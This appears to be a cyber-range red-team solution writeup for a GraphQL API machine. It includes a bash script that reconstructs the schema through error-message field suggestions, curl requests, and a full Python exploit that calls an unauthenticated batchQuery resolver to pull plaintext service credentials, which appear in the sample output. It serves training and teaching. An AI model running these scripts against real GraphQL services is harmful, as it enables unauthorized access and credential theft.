# solve_red.md — M2 · ext-graphql-api
## Red Team Solution Writeup
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Machine:** M2 — RPAL Exploration Data GraphQL API
**Vulnerability:** GraphQL Field Suggestion Schema Reconstruction + batchQuery Missing Authorization
**CWE:** CWE-862 (Missing Authorization) + CWE-200 (Exposure of Sensitive Information)
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1213 (Data from Information Repositories)
**Severity:** Critical — exposes SOAP gateway plaintext credentials → M3 pivot

---

## Overview — What, Why, and How

### What is this vulnerability?

**Part 1 — GraphQL Schema Reconstruction via Field Suggestions**

GraphQL servers that disable introspection are commonly believed to be "schema-blind" — an attacker cannot see what types and fields exist. However, many GraphQL libraries retain a helpful developer feature: **field suggestions**. When you query a field that doesn't exist, the server returns an error like:

```json
{"errors": [{"message": "Cannot query field 'batchQueary'. Did you mean 'batchQuery'?"}]}
```

This suggestion mechanism uses Levenshtein distance — it finds the closest real field name to your mistyped one. By systematically querying near-miss variations of suspected field names, you reconstruct the full schema character by character. This is not a bug in the application — it is a feature of the GraphQL library (Strawberry) that was not disabled.

**Part 2 — batchQuery Resolver Missing Authorization**

Once the `batchQuery` resolver is discovered via suggestions, it can be called without any authentication. The resolver accepts query strings and executes them directly against the database, bypassing all permission middleware. This allows access to `systemAccounts` — a table containing plaintext credentials for the SOAP gateway (M3), the API gateway (M4), and the contractor portal (M5).

### Why does this vulnerability exist?

The `batchQuery` resolver was added by Arjun Mehta's team to support batch data loading for the RPAL mobile application. It was added after the main GraphQL schema security review was completed. Because it doesn't follow the standard `@require_auth` decorator pattern, the permission check was never applied. The code was pushed directly to production without a security review.

---

## Prerequisites

- Credentials from M1: `X-API-Key: RPAL-API-2024-XK9mP3nT8qRs`
- Tool: `curl`, optionally Burp Suite or a GraphQL tool like `graphql-cop`
- Target: `http://203.x.x.x:4000/graphql`

---

## Phase 1 — Reconnaissance

### 1.1 — Confirm GraphQL Endpoint

```bash
# Basic GraphQL endpoint test
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' | python3 -m json.tool
```

Expected (with auth):
```json
{"data": {"__typename": "Query"}}
```
<img width="774" height="315" alt="image" src="https://github.com/user-attachments/assets/f74514b9-fa8b-465f-bb18-a9677bb57d9f" />


Without auth:
```json
{"errors": [{"message": "Authentication required — provide X-API-Key header"}]}
```

### 1.2 — Confirm Introspection is Disabled

```bash
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -H "X-API-Key: RPAL-API-2024-XK9mP3nT8qRs" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool
```
<img width="1474" height="676" alt="image" src="https://github.com/user-attachments/assets/1a97a0d3-ce96-49e1-a5b4-adfd2f39eaa3" />


Expected: `{"errors": [{"message": "GraphQL introspection has been disabled..."}]}`

This confirms introspection is blocked. Standard tooling (`graphql-cop --introspect`, Burp's GraphQL scanner) will stop here. You must use the suggestion technique.

---

## Phase 2 — Schema Reconstruction via Field Suggestions

### 2.1 — Understanding How Field Suggestions Work

When you query a non-existent field, Strawberry returns the closest real field name:

```bash
# Query a plausible-but-wrong field name
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -H "X-API-Key: RPAL-API-2024-XK9mP3nT8qRs" \
  -d '{"query":"{ wellLog { well_id } }"}' | python3 -m json.tool
```

Response:
```json
{"errors": [{"message": "Cannot query field 'wellLog'. Did you mean 'wellLogs'?"}]}
```

<img width="1200" height="489" alt="image" src="https://github.com/user-attachments/assets/7af45fd8-e62e-4a4c-8ad4-2fd597af8188" />


The server just told you the real field name is `wellLogs`. This technique scales: probe variations of suspected names to map the entire schema.

### 2.2 — Systematic Field Discovery

```bash
#!/usr/bin/env bash
# Schema reconstruction via field suggestions
TARGET="http://203.x.x.x:4000/graphql"
KEY="RPAL-API-2024-XK9mP3nT8qRs"

probe() {
    FIELD="$1"
    RESULT=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -H "X-API-Key: $KEY" \
        -d "{\"query\":\"{ ${FIELD} { id } }\"}")
    # Extract suggestion from "Did you mean X?" pattern
    echo "$RESULT" | python3 -c "
import sys, json, re
data = json.load(sys.stdin)
for e in data.get('errors', []):
    msg = e.get('message', '')
    m = re.search(r\"Did you mean '([^']+)'\", msg)
    if m:
        print(f'  {sys.argv[1]} → {m.group(1)}')
    elif 'Cannot query' in msg:
        print(f'  {sys.argv[1]} → NOT FOUND')
" "$FIELD"
}

echo "[*] Probing top-level fields..."
for guess in wellLog wellLogs well_log explorationBlock explorationBlocks block_query \
    employee employees systemAccount systemAccounts internalService internalServices \
    batchQuery batch_query batchQueery batch permitData geoData; do
    probe "$guess"
done
```

**Output:**
```
  wellLog → wellLogs
  explorationBlock → explorationBlocks
  employee → employees
  systemAccount → systemAccounts
  internalService → internalServices
  batchQueery → batchQuery
```

**Key discovery:** `batchQuery`, `systemAccounts`, `internalServices` are all real fields.

### 2.3 — Reconstruct Field Arguments via Suggestions

```bash
# Probe batchQuery arguments
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ batchQuery(query: \"test\") { key data } }"}' | python3 -m json.tool
```

Response:
```json
{"errors": [{"message": "Unknown argument 'query' on field 'Query.batchQuery'. Did you mean 'queries'?"}]}
```

The argument is `queries` (plural) and it's a list. Try:

```bash
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ batchQuery(queries: [\"test\"]) { key data } }"}' | python3 -m json.tool
```

**This succeeds — NO authentication required.** The `batchQuery` resolver has no auth check.

---

## Phase 3 — Exploitation: Unauthorized Data Extraction

### 3.1 — Extract System Accounts (Pivot Credentials)

```bash
curl -s -X POST http://203.x.x.x:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ batchQuery(queries: [\"systemAccounts\", \"internalServices\"]) { key data } }"
  }' | python3 -m json.tool
```

**Expected response:**
```json
{
  "data": {
    "batchQuery": [
      {
        "key": "systemAccounts",
        "data": [
          {
            "account_id": "SVC-002",
            "username": "rpal-tariff-svc",
            "service_name": "Pipeline Tariff SOAP Gateway",
            "endpoint": "http://203.x.x.x:8080/TariffGateway",
            "plaintext_password": "TariffGW@Soap!2024#RPAL",
            "owner": "rajan.iyer@rpal.in",
            "notes": "SOAP gateway service account..."
          },
          ...
        ]
      }
    ]
  }
}
```

### 3.2 — Full Exploit Script

```python
#!/usr/bin/env python3
"""
GraphQL batchQuery AuthZ Bypass — M2 RPAL Exploration Data API
Reconstructs schema via suggestions, then exploits unauthenticated batchQuery.
"""
import requests, json, re

TARGET = "http://203.x.x.x:4000/graphql"

def gql(query, api_key=None):
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["X-API-Key"] = api_key
    r = requests.post(TARGET, json={"query": query}, headers=headers)
    return r.json()

def get_suggestion(field):
    resp = gql(f"{{ {field} {{ id }} }}")
    for e in resp.get("errors", []):
        m = re.search(r"Did you mean '([^']+)'", e.get("message", ""))
        if m:
            return m.group(1)
    return None

print("[*] Phase 1: Schema reconstruction via field suggestions")
interesting = ['wellLog','explorationBlock','employee','systemAccount',
               'internalService','batchQueery','batch_query']
discovered = {}
for f in interesting:
    real = get_suggestion(f)
    if real:
        discovered[f] = real
        print(f"    {f} → {real}")

print(f"\n[+] Discovered {len(discovered)} fields")
print("\n[*] Phase 2: Exploiting unauthenticated batchQuery resolver")

# No auth header — batchQuery has no authorization check
resp = gql('{ batchQuery(queries: ["systemAccounts", "internalServices", "employees"]) { key data } }')

if "errors" in resp and not resp.get("data"):
    print(f"[-] Error: {resp['errors']}")
    exit(1)

results = resp["data"]["batchQuery"]
print("\n[+] Data extracted via unauthenticated batchQuery:\n")
for result in results:
    print(f"  === {result['key'].upper()} ===")
    data = result['data']
    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict):
                for k, v in item.items():
                    if v and v != 'null':
                        print(f"    {k}: {v}")
                print()

print("\n[+] PIVOT CREDENTIALS FOR M3 (SOAP Gateway):")
for result in results:
    if result['key'] == 'systemAccounts':
        for acct in result['data']:
            if 'tariff' in acct.get('service_name', '').lower():
                print(f"    Endpoint:  {acct['endpoint']}")
                print(f"    Username:  {acct['username']}")
                print(f"    Password:  {acct['plaintext_password']}")
```

---

## Pitfalls and Common Mistakes

### Pitfall 1 — Testing batchQuery WITH the API Key
Many participants will add `X-API-Key` to all requests by habit. The bug is that `batchQuery` works **without** auth. Testing without the key first confirms the missing authorization.

### Pitfall 2 — Assuming Introspection Tools Will Find batchQuery
Tools like `graphql-cop`, InQL Burp plugin, and `clairvoyance` will not find `batchQuery` during standard enumeration. `clairvoyance` (wordlist-based introspection bypass) may find it if `batchQuery` is in its wordlist — but its wordlist coverage of domain-specific names like this is poor. Manual suggestion probing is more reliable.

### Pitfall 3 — Wrong Argument Type
`batchQuery` takes `queries: [String!]!` — a list of strings. Sending `queries: "systemAccounts"` (single string, not list) will return a type error. Wrap in square brackets.

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Discovery | Application Layer Protocol: Web Protocols | T1071.001 |
| Discovery | Data from Information Repositories | T1213 |
| Credential Access | Unsecured Credentials | T1552.001 |

---
*solve_red.md | M2 ext-graphql-api | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
